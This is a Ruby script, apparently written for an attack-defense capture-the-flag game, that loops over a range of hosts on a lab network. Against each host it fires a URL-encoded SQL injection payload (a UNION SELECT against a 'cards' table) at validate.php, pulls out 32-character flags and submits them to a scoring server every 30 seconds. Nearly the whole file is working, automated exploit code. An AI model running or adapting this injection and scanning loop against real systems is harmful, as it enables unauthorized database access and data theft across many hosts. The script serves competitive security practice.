#!/usr/bin/ruby

require 'curb'
require 'date'

def getFlag(ip)
    c = Curl::Easy.new("http://#{ip}:8118/view/validate.php?ip=none%27%20UNION%20all%20select%201%2C%20owner%2C%201%2C%201%20from%20cards%20where%20id%3D%28SELECT%20max%28id%29%20from%20cards%29%20limit%201%2C1%3B%0A%3B")
    c.perform
    if /[A-Z0-9]{32}/.match(c.body_str)
        return /[A-Z0-9]{32}/.match(c.body_str)[0]
    end
        return false
end

def submitFlag(flag)
    c = Curl::Easy.new("http://10.10.40.200/SubmitFlagServlet?teamInput=18&flagInput=#{flag}")
    #c.http_auth_types = :basic
    #c.username = 'ctf'
    #c.password = 'password'
    c.perform
    puts /Status:.*/x.match(c.body_str)
end

def rot(value)
    value.tr! "A-Za-z", "N-ZA-Mn-za-m";
end

def checkFlag(flag)
    return false if flag.size != 32
    return false if flag[14..17] == "TEST"
    date = DateTime.strptime(flag[0..13], "%d%m%Y%H%M%S")
    return false if date < DateTime.now
    return true
end

while true do
    puts DateTime.now
(10..30).each do |ip|
    puts "Attacking 10.10.40.#{ip}"
    flag = getFlag("10.10.40.#{ip}")
    if flag
        puts "Got flag, submitting"
        submitFlag(flag) 
    end
end
sleep(30)
end